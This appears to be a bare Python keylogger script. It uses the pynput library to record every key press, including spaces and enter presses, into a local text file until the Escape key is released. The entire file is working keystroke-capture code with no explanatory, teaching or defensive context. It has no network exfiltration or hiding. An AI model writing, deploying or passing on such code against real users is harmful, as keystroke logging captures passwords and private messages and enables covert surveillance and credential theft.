import os
from pynput import keyboard

def on_press(key):
    try:
        with open("keylogs.txt", "a") as file:
            if hasattr(key, 'char'):
                file.write(f"{key.char}")
            elif key == keyboard.Key.space:
                file.write("[SPACE]")
            elif key == keyboard.Key.enter:
                file.write("[ENTER]\n")
    except Exception as e:
        print(f"Error logging keystroke: {e}")

def on_release(key):
    if key == keyboard.Key.esc:
        return False

with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()